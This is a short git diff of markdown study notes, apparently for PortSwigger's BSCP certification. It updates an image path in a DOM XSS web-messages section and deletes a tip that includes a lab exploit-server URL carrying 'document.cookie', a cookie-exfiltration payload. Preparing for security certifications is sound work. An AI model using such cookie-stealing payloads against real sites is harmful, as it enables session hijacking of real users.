@@ -93,15 +93,10 @@ The acronym BSCP has nice simular ring like OSCP  :)
 }
 ```  
 
-![DOM Invader resend web messages](dom-invader-resend-web-messages.png)  
+![DOM Invader resend web messages](images/dom-invader-resend-web-messages.png)  
   
 [Testing for DOM XSS using web messages](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages)  
 
->Optional: Using atob to decoded base64 from below URL if single and double quote jail.  
-
-```
-http://exploit-0ac30095035c7526c09ebd7401a00075.exploit-server.net/bs.png/?bd=document.cookie
-```  
 
 ## Web Cache Poison  
 
